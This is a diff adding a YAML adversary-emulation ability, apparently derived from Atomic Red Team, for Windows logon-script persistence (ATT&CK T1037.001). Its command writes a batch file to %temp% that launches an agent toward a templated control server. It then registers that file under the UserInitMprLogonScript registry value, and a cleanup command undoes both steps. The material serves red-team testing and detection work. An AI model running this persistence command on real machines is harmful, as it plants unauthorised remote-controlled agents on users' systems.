@@ -1,0 +1,21 @@
+- id: 05cde730-2881-4cd5-a68c-7843db27a3d7
+  name: Logon Initialization Scripts (Windows) (Generated from Atomic Red Team)
+  description: |
+    Ability for Boot or Logon Initialization Scripts: Logon Script (Windows) (ATT&CK T1037.001).
+    Adds a registry value to run batch script created in the %temp% directory.
+    Upon execution, there will be a new environment variable in the HKCU\Environment key
+    that can be viewed in the Registry Editor.
+    The batch script will spawn a new agent.
+    Generated from Atomic Red Team procedures (d6042746-07d4-4c92-9ad8-e644c114a231); review and test safely before use.
+  tactic: persistence
+  technique:
+    attack_id: T1037.001
+    name: 'Boot or Logon Initialization Scripts: Logon Script (Windows)'
+  platforms:
+    windows:
+      cmd:
+        command: |
+          echo "#{location} -server #{server} -group #{group}" > %temp%\art.bat &&
+          REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+        cleanup: |
+          REG.exe DELETE HKCU\Environment /v UserInitMprLogonScript /f & del "%temp%\art.bat"
